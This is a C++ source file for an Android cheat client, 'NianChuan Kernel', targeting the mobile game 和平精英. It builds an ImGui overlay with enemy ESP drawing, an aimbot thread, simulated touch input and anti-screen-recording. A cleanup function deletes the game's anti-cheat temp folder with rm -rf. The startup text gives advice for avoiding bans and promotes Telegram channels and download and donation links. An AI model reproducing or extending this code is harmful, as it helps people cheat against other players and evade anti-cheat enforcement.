//NianChuan
//频道 @yxdaili
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#include <dirent.h>
#include <pthread.h>
#include <fstream>
#include <string.h>
#include <time.h>
#include <malloc.h>
#include <iostream>
#include <fstream>
#include "res/weiyan.h"//删除微验请删除这行代码
#include "res/cJSON.h"//删除微验请删除这行代码
#include "res/cJSON.c"//删除微验请删除这行代码
#include "res/Encrypt.h"//删除微验请删除这行代码
#include<iostream>
#include<ctime>
using namespace std;

#include <math.h>
#include <draw.h>
#include "Add/DataReader.h"
#include <TouchHelper.h>
#include "Android_draw/图片/touxiang.h"//主页头像
#include "Android_draw/图片/自瞄开.h"
#include "Android_draw/图片/背景图.h"//自瞄图片
#include "wanbai.hpp"//内置驱动
// #include "wanbai.h"//原来的多驱动如果你要的话，你就换回这个，上面注销掉。
#include "结构体.h" // 结构体
#include "云端频道验证.h" // 云端频道验证体
#include "物资.h"//物资类
#include "imgui_ui.h" //ui主要部分
// #include "Android_draw/图片调用.h"// 绘制手持图片请取消注释此行 1/7
// #include "手持图片.h" // 绘制手持图片请取消注释此行 2/7

//——————————————————————————————————————头文件部分结束
//采用 世界无敌傻B写法 抵御一切检测


// 打个广告
// IKUN内核[衍生]
// 全国榜一 榜二 万分战神 9000淘汰分 多省榜首 国服三战神权威代言内核 独家UI内置驱动 非市面泛滥二改源 独家触摸库 触摸自 瞄 绘 制流畅简洁 支持观战不绘 制自身队伍 无垃圾线性 主打一个美观高端 多有实力作者共同高费时间研发 项目网盘复制到浏览器打开
// https://www.123865.com/s/lgTBjv-ZvSBh
// 自愿捐赠:
// https://www.820faka.cn//links/BDFACB95

// 新增绘制内鬼 适配6.6 超广角 微加速[1.1] 录屏截屏功能 优化触摸库导致开枪卡帧
//嘻嘻




 // 在全局变量区域添加iOS风格按钮的样式变量
ImVec4 iOS_normal_color = ImVec4(0.0f, 0.47f, 1.0f, 1.0f); // iOS默认蓝色
ImVec4 iOS_pressed_color = ImVec4(0.0f, 0.35f, 0.8f, 1.0f); // 按下时颜色
float iOS_button_rounding = 10.0f; // 圆角大小
// iOS开关样式变量
ImVec4 iOS_switch_on_color = ImVec4(0.0f, 0.47f, 1.0f, 1.0f);  // 开启状态颜色
ImVec4 iOS_switch_off_color = ImVec4(0.76f, 0.77f, 0.78f, 1.0f); // 关闭状态颜色
ImVec4 iOS_switch_thumb_color = ImVec4(1.0f, 1.0f, 1.0f, 1.0f);  // 滑块颜色
float iOS_switch_height = 50.0f;  // 开关高度
float iOS_switch_width = 70.0f;   // 开关宽度
bool iOSSwitch(const char* label, bool* v) {
    ImGuiWindow* window = ImGui::GetCurrentWindow();
    if (window->SkipItems)
        return false;

    ImGuiContext& g = *GImGui;
    const ImGuiStyle& style = g.Style;
    const ImGuiID id = window->GetID(label);
    
    float height = iOS_switch_height;
    float width = iOS_switch_width;
    
    ImVec2 pos = window->DC.CursorPos;
    ImVec2 size = ImVec2(width, height);
    
    const ImRect total_bb(pos, pos + size);
    ImGui::ItemSize(total_bb, style.FramePadding.y);
    if (!ImGui::ItemAdd(total_bb, id))
        return false;
    
    bool hovered, held;
    bool pressed = ImGui::ButtonBehavior(total_bb, id, &hovered, &held);
    if (pressed) {
        *v = !(*v);
        ImGui::MarkItemEdited(id);
    }
    
    // 绘制开关背景
    ImU32 bg_color = *v ? ImGui::GetColorU32(iOS_switch_on_color) : ImGui::GetColorU32(iOS_switch_off_color);
    window->DrawList->AddRectFilled(total_bb.Min, total_bb.Max, bg_color, height * 0.5f);
    
    // 绘制滑块
    float thumb_radius = height * 0.5f - 2.0f;
    ImVec2 thumb_pos = *v ? ImVec2(pos.x + width - thumb_radius - 2.0f, pos.y + thumb_radius + 2.0f) 
                          : ImVec2(pos.x + thumb_radius + 2.0f, pos.y + thumb_radius + 2.0f);
    window->DrawList->AddCircleFilled(thumb_pos, thumb_radius, ImGui::GetColorU32(iOS_switch_thumb_color));
    
    // 绘制标签
    if (label[0] != '#') {
        ImGui::SameLine();
        ImGui::TextUnformatted(label);
    }
    
    return pressed;
} 
//控件设计

int PlayerId;
using namespace std;
timer RenderingFPS;
int intIo[10];//复选框
bool wzhz[50];//物资绘制
bool DrawIo[50];//绘制
float NumIo[50];//调节
bool 物资[50];//乐子
ImColor 物资颜色[50];
ImColor 绘制颜色[16]; //0触摸颜色12方框颜色34方框背景56射线78骨骼 (真人/人机)
float 绘制粗细[10]; //12方框粗细34射线粗细56骨骼粗细
float draw_style[20];//滑动条

float fwjl = NumIo[3]; // 自瞄用的，动态范围
DataReader reader;
ImTextureID logo_png, aim_png,beijingtu; //图片纹理 背景图的在内
Data lunxian; // 敌人及自身结构
WuziData wz; // 物资结构
string wht, flp;
// static bool isDown = false;

void Draw_Meun();
void AimBotAuto();
void NumIoLoad(const char *name);
void Draw_Main(ImDrawList *Draw);
void 启动和平精英() {
    string command = "am start -n com.tencent.tmgp.pubgmhd/com.epicgames.ue4.SplashActivity";
    system(command.c_str());
}

// //新增贝塞尔
// float 结果x;
// float 结果y;
// double tx = NumIo[5], ty = NumIo[6];

const char* color_codes[] = {
    "\033[31;1m", // 红色
    "\033[32;1m", // 绿色
    "\033[33;1m", // 黄色
    "\033[34;1m", // 蓝色
    "\033[35;1m", // 紫色
    "\033[36;1m"  // 青色
};
// 辅助函数：清除输入缓冲区
void clearInputBuffer() {
    cin.clear();
    cin.ignore(numeric_limits<streamsize>::max(), '\n');
}
// 统一输入验证函数
bool validateInput(const string& input, const vector<string>& validOptions) {
    string lowerInput = input;
    transform(lowerInput.begin(), lowerInput.end(), lowerInput.begin(), ::tolower);
    for (const auto& opt : validOptions) {
        if (lowerInput == opt) return true;
    }
    return false;
}


//————————————————————————————————————————————————定义类部分结束
//————————————————————————————————————————————————main函数部分开始,里面内容按照顺序执行
int main() {
const char* nobackground_path = "/sdcard/无后台";
if (access(nobackground_path, F_OK) == 0) {
    pid_t pid = fork();
    if (pid > 0) {
        exit(0); // 父进程退出
    } else if (pid == 0) {
        // 子进程继续
    } else {
        fprintf(stderr, "[+]无后台模式开启失败\n");
        exit(1);
    }
}

// 防录屏 - 根据/sdcard/防录屏文件存在性自动判断
const char* antirecord_path = "/sdcard/防录屏";
bool antiRecording = (access(antirecord_path, F_OK) == 0);

// 获取分辨率
screen_config(); 
init_screen_x = screen_x + screen_y;
init_screen_y = screen_y + screen_x;

// 初始化防录屏
if (!init_vulkan(init_screen_x, init_screen_y, antiRecording)) {
    exit(0);
}

/*


    //无后台模式
  while (true) {
        printf("\033[35;1m\n请输入: 1 [开启]，2 [关闭]   (y是开启，n是不开)\033[0m\n");
        printf("[—]是否开启无后台运行(尽量不用开)：");
        cin >> wht;

        if (validateInput(wht, {"1", "y", "2", "n"})) {
            if (wht == "1" || wht == "Y" || wht == "y") {
                pid_t pid = fork();
                if (pid > 0) {
                    exit(0); // 父进程退出
                } else if (pid == 0) {
                    break; // 子进程继续
                } else {
                    fprintf(stderr, "[+]开启无后台失败! 请尝试不开启\n");
                    exit(1);
                }
            } else { // 输入2/N
                break;
            }
        } else {
            printf("\033[35;1m**输入错误，请重新输入**\033[0m\n");
            clearInputBuffer();
        }
    }
    //获取分辨率
    screen_config(); 
    init_screen_x = screen_x + screen_y;
    init_screen_y = screen_y + screen_x;
    while (true) {
        printf("\033[37;1m[+]是否开启防录屏[1/2]：");
        cin >> flp;

        if (validateInput(flp, {"1", "y", "2", "n"})) {
            bool antiRecording = (flp == "1" || flp == "Y" || flp == "y");
            if (!init_vulkan(init_screen_x, init_screen_y, antiRecording)) {
                exit(0);
            }
            break;
        } else {
            printf("\033[35;1m输入错误，请重新输入\033[0m\n");
            clearInputBuffer();
        }
    }

*/

draw_style[10] = 1;
NumIoLoad("NianChuan配置");
	printf("\033[35;1m");		// 粉红色
	printf("\nWelcome NianChuan Kernel");
	printf("Telegram @yxdaili");
printf("\n本辅助使用规则\n①拉闸自己去看是不是上巡查了\n②避免小白号 尽量40级以上\n③与之前数据不匹配 导致拉闸 比如 你之前每局杀5-6个 用辅助之后 每局杀10个以上 短时间技术提升 导致拉闸\n在此重审 辅助有风险 本辅助仅供Linux交流使用 如有侵权 联系删除\n请在24小时内删除本文件 否则后果自负\n如有侵权贵公司游戏环境 联系删除\n使用辅助所有后果 由使用者自行承担\n最终解释权归NianChuan所有\n联系方式 Telegram @XiaoChuan8886\n如您进入 默认同意本辅助使用规则");
	printf("\033[33;1m");		// 黄色
// 随机颜色
if (draw_style[10] == 1) {
printf("当前载入游戏: 和平精英\n");
printf("再次重申 本辅助仅限于Linux交流 请勿使用违法犯罪\n|||—>—>—>—>–>–>–>–>–>—>—>–>–>–>–>|||\n");

}




// 渲染初始化
ImGui_init();
// 触摸初始化
// tx = NumIo[5], ty = NumIo[6];
TouchScreenHandle();
// 自瞄线程
new thread(AimBotAuto);
// 音量键线程
new thread(音量键隐藏);
// 获取图片纹理
logo_png = VK.ImAgeHeadFile(touxiang, sizeof(touxiang));//头像
aim_png = VK.ImAgeHeadFile(自瞄开, sizeof(自瞄开));//自瞄按钮
beijingtu = VK.ImAgeHeadFile(背景图, sizeof(背景图));//背景图
// 加载枪械图片(); // 绘制手持图片请取消注释此行 3/7

// 初始化pfs
RenderingFPS.AotuFPS_init();
// 设置均和
RenderingFPS.setAffinity();

ImGui_ImplAndroid_NewFrame(init_screen_x, init_screen_y);

// 程序主循环
while (true) {
RenderingFPS.SetFps(NumIo[12]);
RenderingFPS.AotuFPS();

VK_Begin();
if (lunxian.pid > 0 && lunxian.libUE4 > 0)
Draw_Main(ImGui::GetForegroundDrawList());
Draw_Meun();
VK_End();      
}

// 清理资源
shutdown();
return 0;
}
 


//————————————————————————————————————————————————main函数部分结束

//NianChuan
//频道 @yxdaili
//NianChuan
//频道 @yxdaili//NianChuan
//频道 @yxdaili//NianChuan
//频道 @yxdaili//NianChuan
//频道 @yxdaili//NianChuan
//频道 @yxdaili//NianChuan
//频道 @yxdaili//NianChuan
//频道 @yxdaili//NianChuan
//频道 @yxdaili//NianChuan
//频道 @yxdaili//NianChuan
//频道 @yxdaili//NianChuan
//频道 @yxdaili//NianChuan
//频道 @yxdaili//NianChuan
//频道 @yxdaili//NianChuan
//频道 @yxdaili//NianChuan
//频道 @yxdaili//NianChuan
//频道 @yxdaili//NianChuan
//频道 @yxdaili

// 初始配置
void CleanData() {
绘制颜色[0] = ImColor(255, 0, 0, 150);
绘制颜色[1] = {1.0f,0.0f,0.0f,1.0f};
绘制颜色[2] = ImColor(255,255,255,255);
绘制颜色[3] = ImColor(0,0,0,25);
绘制颜色[4] = ImColor(0,0,0,0);
绘制颜色[5] = ImColor(255,0,0,255);
绘制颜色[6] = ImColor(255,255,255,255);
绘制颜色[7] = ImColor(255,0,0,255);
绘制颜色[8] = ImColor(255,255,255,255);
绘制粗细[1] = 1.0f;
绘制粗细[2] = 1.0f;
绘制粗细[3] = 0.5f;//射线
绘制粗细[4] = 0.5f;//射线
绘制粗细[5] = 2.0f;
绘制粗细[6] = 2.0f;
NumIo[1] = 300.0f;  
NumIo[2] = 400.0f;
NumIo[3] = 120.0f;
NumIo[4] = 15.0f;
NumIo[6] = 1400.0f;
NumIo[5] = 650.0f;
NumIo[7] = 300.0f;  
NumIo[8] = 0.0f;  
NumIo[9] = 3.5f; 
NumIo[10] = 0.0f;  
NumIo[11] = 600.0f;
NumIo[12] = 90;
NumIo[13] = 0.0f;
NumIo[14] = 1.5f;
NumIo[15] = 0.0f;
NumIo[16] = 100.0f;
NumIo[17] = 400.0f;
NumIo[9918] = 150.0f;
NumIo[20] = 0.0f;
NumIo[21] = 0.0f;
NumIo[22] = 1.0f;
NumIo[31] = 50;
NumIo[32] = 200;
draw_style[3] = 120;
draw_style[7] = 1;
draw_style[8] = 100;
draw_style[9] = 100;
draw_style[12] = 0;
DrawIo[40] = true;
NumIo[40] =0;
DrawIo[68] = DrawIo[67] = DrawIo[799] = false; 
}

// 一些函数的定义
#include "Android_draw/其他.h"
#define AIMBOT_SEPARATED
#include "Aim/Aim.h"
int AimCount, MaxPlayerCount, Gmin = -1;
float zm_x, zm_y;
bool IsAimLongAim = false;
char AimName[32];
Vec2 vpvp;
AimStruct Aim[100]; // 自瞄结构



// 绘图主函数
void Draw_Main(ImDrawList *Draw) {



// 自瞄方式
// 自瞄 圆圈 视角 框内
if (NumIo[40] == 0.0) {
    // 模式0：无操作
// } else if (NumIo[40] == 1.0) {
    // 模式1：中心圆圈+射线
    if (DrawIo[20] && lunxian.IsFiring == 1 && DrawIo[25] && Gmin != -1) {    
        Draw->AddCircle({screen_x / 2, screen_y / 2}, fwjl, ImColor(255, 255, 255, 255), 0, 3.0f);
    } else if (DrawIo[20]) {
        Draw->AddCircle({screen_x / 2, screen_y / 2}, NumIo[3], ImColor(255, 255, 255, 255), 0, 3.0f);
    }
    if (DrawIo[45] && Gmin != -1) {
        Draw->AddLine({screen_x / 2, screen_y / 2}, {vpvp.x, vpvp.y}, ImColor(255, 255, 255, 255), 2.5f);
    }
} else if (NumIo[40] == 1.0) {
    // 模式2：动态半径双圆圈
    if (DrawIo[20] && lunxian.IsFiring == 1 && DrawIo[25] && Gmin != -1) {
        Draw->AddCircle({vpvp.x, vpvp.y}, ImGui::GetIO().MouseWheel * 30 + 8, ImColor(255, 255, 0, 0), 0, 1.0f);
        Draw->AddCircle({screen_x / 2, screen_y / 2}, fwjl, ImColor(255, 255, 0, 0), 0, 3.0f);
    } else if (DrawIo[20] && Gmin != -1) {
        Draw->AddCircle({vpvp.x, vpvp.y}, NumIo[3], ImColor(255, 255, 255, 255));
    }
} else if (NumIo[40] == 3.0){
   	

    // 框内自瞄逻辑
    if (DrawIo[20] && lunxian.IsFiring == 1 && DrawIo[25] && Gmin != -1)
    {
        Draw->AddCircle({vpvp.x, vpvp.y}, ImGui::GetIO().MouseWheel * 30 + 8, ImColor(255, 255, 0, 0), 0, 1.0f);
        Draw->AddCircle({screen_x / 2, screen_y / 2}, fwjl, ImColor(255, 255, 0, 0), 0, 3.0f);
    }
    else if (DrawIo[20] && Gmin != -1)
    {
        Draw->AddCircle({vpvp.x, vpvp.y}, NumIo[3], ImColor(ImVec4(255 / 255.f, 255 / 255.f, 258 / 255.f, 1.0f)));
    }
}

 if (draw_style[10] == 1) {
#include "Android_draw/hook.h"

}

//骨骼节点开关选择
if (draw_style[91] == 0) {
DrawIo[9918] = false;
}
if (draw_style[91] == 1) {
DrawIo[9918] = true;
}

// 自瞄圆圈
if(DrawIo[45]){
if(DrawIo[20] && lunxian.TotalUp){
if (DrawIo[20] && lunxian.IsFiring == 1 && DrawIo[25]&&Gmin != -1) {
Draw->AddCircle({screen_x / 2, screen_y / 2}, fwjl, ImColor(255,160,122,255), 0, 2.5f);
}else if(DrawIo[20]) {
Draw->AddCircle({screen_x / 2, screen_y / 2}, NumIo[3], ImColor(255,255,255,255), 0, 2.5f); 
}
}
}
if(DrawIo[44]){
// 自瞄射线
if (Gmin != -1) {
Draw->AddLine({screen_x / 2, screen_y / 2}, {vpvp.x, vpvp.y}, ImColor(255,255,255,255), 3.0f);
}
}
// 触摸区域
// 触摸区域
if (DrawIo[21]) {
string ssf;  
ssf += "勿放控件，长按拖动\n确认好之后关闭即可";
auto textSize = ImGui::CalcTextSize(ssf.c_str(), 0, 32);
Draw->AddRectFilled({0,0}, {screen_x, screen_y},ImColor(0,0,0,110));
Draw->AddRectFilled({NumIo[6] - NumIo[7] / 2, screen_y - NumIo[5] + NumIo[7] / 2}, {NumIo[6] + NumIo[7] / 2, screen_y - NumIo[5] - NumIo[7] / 2}, 绘制颜色[0]); 
Draw->AddText(NULL, 32, {NumIo[6] - (textSize.x / 2), screen_y - NumIo[5]}, ImColor(255, 255, 255), ssf.c_str());
}


reader.loadDataFromFile("/data/自定义物资.txt");
//自定义物资
if (wzhz[2]) {
    reader.loadDataFromFile("/data/自定义物资.txt");
}



} //绘图函数结束


// static float 贝塞尔曲线动画速度;
// 线性插值
void 线性插值() {
Lerp(窗口x.beg, 窗口x.end, 0.111f);
Lerp(窗口y.beg, 窗口y.end, 0.1f);
Lerp(位置x.beg, 位置x.end, 0.05f);
Lerp(位置y.beg, 位置y.end, 0.1f);
Lerp(圆角值.beg, 圆角值.end, 0.1f);
Lerp(设置.beg, 设置.end, 0.06f);
Lerp(调色板.beg, 调色板.end, 0.06f);
Lerp(homepage, homepages, 0.06f);
Lerp(setup, setups, 0.08f);
Lerp(调色板页数.beg, 调色板页数.end, 0.04f);
Lerp(灵动岛宽度.beg, 灵动岛宽度.end, 0.125f);
Lerp(灵动岛高度s.beg, 灵动岛高度s.end, 0.1f);
Lerp(灵动岛高度x.beg, 灵动岛高度x.end, 0.1f);
Lerp(圆球.beg, 圆球.end, 0.15f);
Lerp(字体位置.beg, 字体位置.end, 0.155f);
Lerp(字体大小.beg, 字体大小.end, 0.155f);
}


void Draw_Meun() {


window_x = 1250.0f;
window_y = 700.0f;
灵动岛();
自瞄图片();
线性插值();
if (开关) {
窗口x.end = 1250.0f;
窗口y.end = 700.0f;
位置x.end = (float)screen_x/2 - (窗口x.beg - 设置.beg + 调色板.beg)/2;
位置y.end = (float)screen_y/2 - 窗口y.beg/2;
} else {
窗口x.end = 0;
窗口y.end = 0;
位置x.end = 0;
位置y.end = 0;
}
if (窗口x.beg < 50) windows = 0;else windows = 1;

//ImGui::SetNextWindowPos({位置x.beg, 位置y.beg}); //设置窗口位置 注释我就可以移动
ImGui::SetNextWindowSize(ImVec2(窗口x.beg - 设置.beg + 调色板.beg, 窗口y.beg)); //设置窗口的大小 
if (windows) {

zhu_set(); //主窗口设置
ImGui::Begin("汪汪", &window, /*ImGuiWindowFlags_NoMove | ImGuiWindowFlags_NoResize | */ImGuiWindowFlags_NoDecoration | ImGuiWindowFlags_AlwaysAutoResize );
ImGui::PopStyleVar(); // 恢复之前的圆角设置 
// ImGui::PopStyleColor(); //释放边框的颜色设置
aevrage_all = window_x / 6.302521f; 
aevrage_now = ImGui::GetWindowSize().x / 6.302521f; 
// aevrage_now = ImGui::GetWindowSize().x / 6.25f; 
tab0 = window_y * 0;
tab1  = window_y * 1;
tab2 = window_y * 2;
tab3 = window_y * 3;
tab4 = window_y * 4;

// 绘制第一个子窗口
if (window) {
// 背景图
        ImVec2 pos = ImGui::GetWindowPos();
        ImVec2 size = ImGui::GetWindowSize();
        ImGui::GetWindowDrawList()->AddImage(
            beijingtu,  // 这个是背景图
            pos,
            ImVec2(pos.x + size.x, pos.y + size.y)
        );

ImGui::SetCursorPos(ImVec2(15, 15));
ImGui::BeginChild("左侧标题栏", ImVec2(aevrage_now, 670), true);
DrawLogo(logo_png ,{ImGui::GetWindowPos().x + aevrage_now/1.944444f, ImGui::GetWindowPos().y + 90}, 85);
//减32是因为imgui控件每个间隔16像素
ImGui::SetCursorPosY(ImGui::GetCursorPosY() + 5); //设置光标位置
ImGui::Separator();
	// 保存原始样式
ImGui::PushStyleColor(ImGuiCol_Text, ImVec4(0.0f, 0.0f, 0.0f, 1.0f)); // 黑色字体
ImGui::PushStyleColor(ImGuiCol_Button, ImVec4(0.6f, 0.6f, 0.6f, 1.0f)); // 灰色背景
ImGui::PushStyleColor(ImGuiCol_ButtonHovered, ImVec4(0.7f, 0.7f, 0.7f, 1.0f)); // 悬停时稍亮
ImGui::PushStyleColor(ImGuiCol_ButtonActive, ImVec4(0.5f, 0.5f, 0.5f, 1.0f)); // 按下时稍暗
ImGui::PushStyleVar(ImGuiStyleVar_FrameRounding, 10.0f); // 圆角大小

if (ImGui::Button("主页", ImVec2(140, 66)))
{
    Tab = 0;					
}
ImGui::ItemSize(ImVec2(0, 2));
if (ImGui::Button("绘制", ImVec2(140, 66)))
{
    Tab = 1;					
}
ImGui::ItemSize(ImVec2(0, 2));
if (ImGui::Button("自瞄", ImVec2(140, 66)))
{
    Tab = 2;				
} 
ImGui::ItemSize(ImVec2(0, 2));
if (ImGui::Button("设置", ImVec2(140, 66)))
{
    Tab = 3;					
}
ImGui::ItemSize(ImVec2(0, 2));
if (ImGui::Button("基址", ImVec2(140, 66)))
{
    Tab = 4;					
}
ImGui::ItemSize(ImVec2(0, 2));
if (ImGui::Button("隐藏", ImVec2(140, 66)))
{
    开关 = false;
}

// 恢复原始样式
ImGui::PopStyleVar();
ImGui::PopStyleColor(4);
ImGui::EndChild(); 
    

    

if (Tab == 0) {
homepages = tab0;
设置.end = 0;
} else if (Tab == 1) {
homepages = tab1;
设置.end = 0;
} else if (Tab == 2) {
homepages = tab2;
设置.end = 0;
} else if (Tab == 3) {
homepages = tab3;
设置.end = 252.0f;
} else if (Tab == 4) {
homepages = tab4;
设置.end = 0;
}

// UI排版

ImGui::SetCursorPos(ImVec2(aevrage_now + 30, 15 + tab0 - homepage));
ImGui::BeginChild("主页，第一排，第一个", ImVec2(aevrage_now*3, 670), true); 
主页_1();
ImGui::EndChild();

ImGui::SetCursorPos(ImVec2(aevrage_now*4 + 45, 15 + tab0 - homepage));
ImGui::BeginChild("主页，第一排，第二个", ImVec2(aevrage_now*2, 670), true); 
主页_2();
ImGui::EndChild();

ImGui::SetCursorPos(ImVec2(aevrage_now + 30, 15 + tab1 - homepage));
ImGui::BeginChild("绘制，第一排，第一个", ImVec2(aevrage_now*3, 410), true); 
绘制_1();
ImGui::EndChild();


ImGui::SetCursorPos(ImVec2(aevrage_now*4 + 45, 15 + tab1 - homepage));
ImGui::BeginChild("绘制，第一排，第二个", ImVec2(aevrage_now*2, 320), true);
绘制_2();
ImGui::EndChild();


ImGui::SetCursorPos(ImVec2(aevrage_now + 30, 440 + tab1 - homepage));
ImGui::BeginChild("绘制，第二排，第一个", ImVec2(aevrage_now*3, 245), true, ImGuiWindowFlags_NoScrollbar);
绘制_3();
ImGui::EndChild();


ImGui::SetCursorPos(ImVec2(aevrage_now*4 + 45, 350 + tab1 - homepage));
ImGui::BeginChild("绘制，第二排，第二个", ImVec2(aevrage_now*2, 335), true, ImGuiWindowFlags_NoScrollbar);
绘制_4();
ImGui::EndChild();


ImGui::SetCursorPos(ImVec2(aevrage_now + 30, 15 + tab2 - homepage));
ImGui::BeginChild("自瞄，第一排，第一个", ImVec2(aevrage_now*3, 340), true, ImGuiWindowFlags_NoScrollbar);
自瞄_1();
ImGui::EndChild();


ImGui::SetCursorPos(ImVec2(aevrage_now*4 + 45, 15 + tab2 - homepage));
ImGui::BeginChild("自瞄，第一排，第二个", ImVec2(aevrage_now*2, 670), true);
自瞄_2();
ImGui::EndChild();


ImGui::SetCursorPos(ImVec2(aevrage_now + 30, 370 + tab2 - homepage));
ImGui::BeginChild("自瞄，第二排，第一个", ImVec2(aevrage_now*3, 315), true, ImGuiWindowFlags_NoScrollbar);
自瞄_3();
ImGui::EndChild();

设置_调色板_size = 调色板.beg / 4.5f;
ImGui::SetCursorPos(ImVec2(aevrage_now + 30, 15 + tab3 - homepage));
ImGui::BeginChild("设置", ImVec2(aevrage_all*4 - 设置_调色板_size, 670), true, ImGuiWindowFlags_NoScrollbar);
设置页面();
ImGui::EndChild();

ImGui::SetCursorPos(ImVec2(aevrage_all*5.03f - 设置_调色板_size / 3.2f, 15 + tab3 - homepage));
ImGui::BeginChild("设置2", ImVec2(aevrage_all*1.75f, 670), true, ImGuiWindowFlags_NoScrollbar);
设置_0();
ImGui::EndChild();

ImGui::SetCursorPos(ImVec2(aevrage_now + 30, 15 + tab4 - homepage));
ImGui::BeginChild("基址内存", ImVec2(aevrage_all*4 - 设置_调色板_size, 670), true, ImGuiWindowFlags_NoScrollbar);
基址();
ImGui::EndChild();
}
ImGui::End();
}
}
//——————————————————————————————————UI设计部分结束

//按钮位置调整
void 清理(){
system("rm -rf /data/user/0/com.tencent.tmgp.pubgmhd/files/ano_tmp");
system("rm -rf /data/data/com.tencent.tmgp.pubgmhd/files/ano_tmp");
}
void 主页_1() {
string bottomText = "NianChuan Kernel [@yxdaili]"; // 示例文本
    auto bottomTextSize = ImGui::CalcTextSize(bottomText.c_str(), 0, 60); // 文本大小
    ImVec2 bottomTextPos((screen_x - bottomTextSize.x) / 2, screen_y - bottomTextSize.y - 10); // 文本位置，距离屏幕底部 10 像素
    ImColor bottomTextColor(0, 255, 0, 240); // 文本颜色为绿色
    ImGui::GetForegroundDrawList()->AddText(NULL, 30, bottomTextPos, bottomTextColor, bottomText.c_str());
   
#include "imgui.h"
#include <cmath> // 用于sin函数
#include <vector> // 用于存储颜色数组
#include <chrono> // 用于获取当前时间
#include <iomanip> // 用于格式化时间
#include <sstream> // 用于将时间转换为字符串

    static float time = 0.0f; // 静态变量用于记录时间
    time += ImGui::GetIO().DeltaTime; // 每帧更新时间

    // 定义一个颜色数组，包含20多种颜色
    const std::vector<ImVec4> colors = {
        ImVec4(1.0f, 0.0f, 0.0f, 1.0f),    // 红色
        ImVec4(1.0f, 0.5f, 0.0f, 1.0f),    // 橙色
        ImVec4(1.0f, 1.0f, 0.0f, 1.0f),    // 黄色
        ImVec4(0.0f, 1.0f, 0.0f, 1.0f),    // 绿色
        ImVec4(0.0f, 1.0f, 1.0f, 1.0f),    // 青色
        ImVec4(0.0f, 0.0f, 1.0f, 1.0f),    // 蓝色
        ImVec4(0.5f, 0.0f, 1.0f, 1.0f),    // 紫色
        ImVec4(1.0f, 0.0f, 1.0f, 1.0f),    // 粉红色
        ImVec4(1.0f, 0.75f, 0.8f, 1.0f),   // 浅粉色
        ImVec4(0.75f, 0.75f, 0.75f, 1.0f), // 灰色
        ImVec4(0.5f, 0.25f, 0.0f, 1.0f),   // 棕色
        ImVec4(0.0f, 0.5f, 0.5f, 1.0f),    // 浅青色
        ImVec4(0.5f, 0.5f, 0.0f, 1.0f),    // 橄榄绿
        ImVec4(0.0f, 0.75f, 0.25f, 1.0f),  // 森林绿
        ImVec4(0.25f, 0.0f, 0.5f, 1.0f),   // 深紫色
        ImVec4(0.75f, 0.0f, 0.25f, 1.0f),  // 深红色
        ImVec4(0.0f, 0.25f, 0.5f, 1.0f),   // 深蓝色
        ImVec4(0.25f, 0.5f, 0.0f, 1.0f),   // 深绿色
        ImVec4(0.5f, 0.0f, 0.25f, 1.0f),   // 深紫色
        ImVec4(0.0f, 0.5f, 0.75f, 1.0f),   // 深青色
        ImVec4(0.75f, 0.25f, 0.0f, 1.0f),  // 深橙色
        ImVec4(0.25f, 0.75f, 0.0f, 1.0f),  // 深黄色
        ImVec4(0.0f, 0.25f, 0.75f, 1.0f)   // 深青色
    };

    // 计算当前颜色的索引
    float index = fmod(time, colors.size());
    int current_index = static_cast<int>(index);
    int next_index = (current_index + 1) % colors.size();

    // 计算插值比例
    float t = index - static_cast<float>(current_index);

    // 插值计算当前颜色
    ImVec4 current_color = colors[current_index];
    ImVec4 next_color = colors[next_index];
    ImVec4 color = ImVec4(
        current_color.x + (next_color.x - current_color.x) * t,
        current_color.y + (next_color.y - current_color.y) * t,
        current_color.z + (next_color.z - current_color.z) * t,
        current_color.w);

    // 获取当前时间并格式化为字符串
    auto now = std::chrono::system_clock::now();
    auto now_time_t = std::chrono::system_clock::to_time_t(now);
    std::stringstream ss;
    ss << std::put_time(std::localtime(&now_time_t), "%Y-%m-%d %H:%M:%S"); // 格式化为 YYYY-MM-DD HH:MM:SS
    std::string current_time_str = ss.str();

    // 设置文本颜色并渲染文本
ImGui::PushStyleColor(ImGuiCol_Text, color);
CenteredText("      NianChuan Kernel", 1.5f);
ImGui::PopStyleColor();
ImGui::BeginChild("主页独白", ImVec2(ImGui::GetContentRegionAvail().x, 170), true, ImGuiWindowFlags_NoScrollbar);

    ImGui::PushStyleColor(ImGuiCol_Text, color);
    ImGui::Text("泥泞的路走出清晰的脚印\n各位苦厄难磨凌云志\nTG @yxdaili", current_time_str.c_str());
    ImGui::PopStyleColor();

ImGui::EndChild();

ImGui::TextColored(ImColor(230, 0, 0,225), " 此辅助为公益辅助 仅限Linux交流 ");
ImGui::Text (" 帧率: %1.f   VK渲染耗时: %.3fms ", ImGui::GetIO().Framerate, ImGui::GetIO().DeltaTime * 1000.0f);
ImGui::Text (" 设备分辨率为: %dx%d", screen_x, screen_y);
if (lunxian.libUE4)
{
ImGui::TextColored(ImColor(0, 255, 0,225), " libUE4.so: 0x%lX -正常", lunxian.libUE4);
} else {
ImGui::TextColored(ImColor(255, 0, 0,225), " libUE4.so: 0x%lX -异常", lunxian.libUE4);
}


ImGui::TextColored(ImColor(230, 0, 0,225), " 游戏:");
// 和平精英按钮
ImGui::PushStyleColor(ImGuiCol_Button, draw_style[10] == 1 ? 
    ImVec4(0.0f, 0.5f, 0.0f, 1.0f) :  // 选中状态颜色
    ImVec4(0.3f, 0.3f, 0.3f, 1.0f));  // 未选中状态颜色
if (ImGui::Button("和平精英##GameSelect", ImVec2(130, 50))) {
    draw_style[10] = 1;
    NumIoSave("NianChuan配置");  // 保存配置
}
ImGui::TextColored(ImColor(230, 0, 0,225), "演不演决定走的远不远");
ImGui::PopStyleColor();
}


void 主页_2() {
title("录制");
            ImGui::SameLine();
            ImGui::TextDisabled("(?)");
            if (ImGui::BeginItemTooltip())
            {
              ImGui::PushTextWrapPos(ImGui::GetFontSize() * 35.0f);
              ImGui::TextUnformatted(
              "tips:\n"
              "1.截屏录屏保存在/sdcard/目录下\n"
              "2.清理游戏数据是清理ano无危险\n");
              ImGui::PopTextWrapPos();
              ImGui::EndTooltip();
            }            

static float 录屏时长 = 30; // 默认时间为10秒
static atomic<bool> isRecording(false); // 全局变量
static float lp_beg, lp_end;
lp_beg += (lp_end - lp_beg) * (0.2f * speed); // 动画速率

SliderFloat("自定义录制秒数", &录屏时长, 1, 120,"%1.f");
ImGui::Spacing();ImGui::Spacing();ImGui::Spacing();

Line(365);
